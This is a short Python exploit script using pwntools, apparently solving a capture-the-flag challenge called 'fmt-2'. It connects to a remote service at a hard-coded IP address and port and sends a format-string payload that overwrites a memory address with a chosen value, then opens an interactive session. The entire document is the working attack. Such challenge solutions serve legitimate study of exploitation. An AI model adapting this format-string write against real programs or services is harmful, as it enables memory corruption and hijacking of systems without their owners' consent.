#!/usr/bin/env python3
from pwn import *
import sys
import pwnlib.shellcraft
import pwnlib

c = 0
pwn_file = "./fmt-2"
elf = ELF(pwn_file)
context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

context.log_level = 100
context.log_level = 'debug'
c = process(pwn_file)
c = remote('140.110.112.77', '4003')
c.sendafter('Input:', fmtstr_payload(6, {0x404050: 0xfaceb00c}, write_size='byte', numbwritten=0))
#c.sendlineafter('Input:', c.recvn(16))
c.interactive()
c.close()
